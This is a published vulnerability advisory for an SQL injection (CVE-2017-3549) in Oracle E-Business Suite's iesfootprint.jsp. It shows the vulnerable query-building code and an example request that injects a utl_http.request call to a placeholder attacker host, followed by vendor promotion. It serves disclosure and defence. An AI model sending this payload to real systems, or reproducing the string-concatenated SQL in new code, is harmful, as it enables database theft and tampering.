@@ -1,0 +1,186 @@
+Application: Oracle E-Business Suite
+Versions Affected: Oracle EBS 12.2.3
+Vendor URL: http://oracle.com
+Bug: SQL injection
+Reported: 23.12.2016
+Vendor response: 24.12.2016
+Date of Public Advisory: 18.04.2017
+Reference: Oracle CPU April 2017
+Author: Dmitry Chastuhin (ERPScan)
+
+Description
+
+1. ADVISORY INFORMATION
+
+Title:[ERPSCAN-17-021] SQL Injection in E-Business Suite IESFOOTPRINT
+Advisory ID: [ERPSCAN-17-021]
+Risk: high
+CVE: CVE-2017-3549
+Advisory URL: https://erpscan.com/advisories/erpscan-17-021-sql-injection-e-business-suite-iesfootprint/
+Date published: 18.04.2017
+Vendors contacted: Oracle
+
+
+2. VULNERABILITY INFORMATION
+
+Class: SQL injection
+Impact: read sensitive data, modify data from database
+Remotely Exploitable: yes
+Locally Exploitable: no
+
+CVSS Information
+
+CVSS Base Score v3:    8.0 / 10
+CVSS Base Vector:
+AV : Attack Vector (Related exploit range) Network (N)
+AC : Attack Complexity (Required attack complexity) High (H)
+PR : Privileges Required (Level of privileges needed to exploit) High (H)
+UI : User Interaction (Required user participation) None (N)
+S : Scope (Change in scope due to impact caused to components beyond
+the vulnerable component) Changed (C)
+C : Impact to Confidentiality High (H)
+I : Impact to Integrity High (H)
+A : Impact to Availability High (H)
+
+3. VULNERABILITY DESCRIPTION
+
+The code comprises an SQL statement containing strings that can be
+altered by an attacker. The manipulated SQL statement can be used then
+to retrieve additional data from the database or to modify the data
+without authorization.
+
+4. VULNERABLE PACKAGES
+
+Oracle EBS 12.2.3
+
+5. SOLUTIONS AND WORKAROUNDS
+
+To correct this vulnerability, implement Oracle CPU April 2017
+
+6. AUTHOR
+
+Dmitry Chastuhin
+
+
+7. TECHNICAL DESCRIPTION
+
+PoC
+
+vulnerable jsp name is  iesfootprint.jsp
+
+ deployDate = ((request.getParameter("deployDate")) != null) ?
+request.getParameter("deployDate") : "";
+  responseDate = ((request.getParameter("responseDate")) != null) ?
+request.getParameter("responseDate") : "";
+  dscriptName = ((request.getParameter("dscript_name")) != null) ?
+request.getParameter("dscript_name") : "";
+  dscriptId = ((request.getParameter("dscriptId")) != null) ?
+request.getParameter("dscriptId") : "";
+%>
+
+<%
+// Process the data based on params
+if (showGraph) {
+   // Create Query String
+   StringBuffer query = new StringBuffer("SELECT panel_name,
+count_panels, avg_time, min_time, max_time, ");
+   query.append("\'").append(_prompts[10]).append("\'");
+   query.append(" Average_Time FROM (SELECT rownum, panel_name,
+count_panels, avg_time, min_time, max_time FROM (SELECT Panel_name,
+count(panel_name) count_panels,
+(sum(total_time)/count(panel_name))/1000 avg_time, min(min_time)/1000
+min_time, max(max_time)/1000 max_time FROM IES_SVY_FOOTPRINT_V WHERE
+dscript_id = ");
+   query.append(dscriptId);
+   query.append(" AND start_time between ");
+   query.append("\'").append(deployDate).append("\'");
+   query.append(" and ");
+   query.append("\'").append(responseDate).append("\'");
+   query.append(" GROUP BY panel_name ORDER BY avg_time desc)) WHERE
+rownum < 11");
+
+
+
+   // Get XMLDocument for the corresponding query and Paint graph
+   try {
+
+       XMLDocument xmlDoc = XMLServ.getSQLasXML(query.toString());
+       htmlString =XMLServ.getXMLTransform(xmlDoc,htmlURL);
+
+Approximate request with SQL injection
+
+
+http://ebs.example.com/OA_HTML/iesfootprint.jsp?showgraph=true&dscriptId=11'
+AND utl_http.request('http://attackers_host/lalal')='1' GROUP BY
+panel_name)) --
+
+
+
+
+
+8. ABOUT ERPScan Research
+
+ERPScan research team specializes in vulnerability research and
+analysis of critical enterprise applications. It was acknowledged
+multiple times by the largest software vendors like SAP, Oracle,
+Microsoft, IBM, VMware, HP for discovering more than 400
+vulnerabilities in their solutions (200 of them just in SAP!).
+
+ERPScan researchers are proud of discovering new types of
+vulnerabilities (TOP 10 Web Hacking Techniques 2012) and of the "The
+Best Server-Side Bug" nomination at BlackHat 2013.
+
+ERPScan experts participated as speakers, presenters, and trainers at
+60+ prime international security conferences in 25+ countries across
+the continents ( e.g. BlackHat, RSA, HITB) and conducted private
+trainings for several Fortune 2000 companies.
+
+ERPScan researchers carry out the EAS-SEC project that is focused on
+enterprise application security awareness by issuing annual SAP
+security researches.
+
+ERPScan experts were interviewed in specialized info-sec resources and
+featured in major media worldwide. Among them there are Reuters,
+Yahoo, SC Magazine, The Register, CIO, PC World, DarkReading, Heise,
+Chinabyte, etc.
+
+Our team consists of highly-qualified researchers, specialized in
+various fields of cybersecurity (from web application to ICS/SCADA
+systems), gathering their experience to conduct the best SAP security
+research.
+
+9. ABOUT ERPScan
+
+ERPScan is the most respected and credible Business Application
+Cybersecurity provider. Founded in 2010, the company operates globally
+and enables large Oil and Gas, Financial, Retail and other
+organizations to secure their mission-critical processes. Named as an
+‘Emerging Vendor’ in Security by CRN, listed among “TOP 100 SAP
+Solution providers” and distinguished by 30+ other awards, ERPScan is
+the leading SAP SE partner in discovering and resolving security
+vulnerabilities. ERPScan consultants work with SAP SE in Walldorf to
+assist in improving the security of their latest solutions.
+
+ERPScan’s primary mission is to close the gap between technical and
+business security, and provide solutions for CISO's to evaluate and
+secure SAP and Oracle ERP systems and business-critical applications
+from both cyberattacks and internal fraud. As a rule, our clients are
+large enterprises, Fortune 2000 companies and MSPs, whose requirements
+are to actively monitor and manage security of vast SAP and Oracle
+landscapes on a global scale.
+
+We ‘follow the sun’ and have two hubs, located in Palo Alto and
+Amsterdam, to provide threat intelligence services, continuous support
+and to operate local offices and partner network spanning 20+
+countries around the globe.
+
+
+
+
+Address USA: 228 Hamilton Avenue, Fl. 3, Palo Alto, CA. 94301
+
+Phone: 650.798.5255
+
+Twitter: @erpscan
+
+Scoop-it: Business Application Security
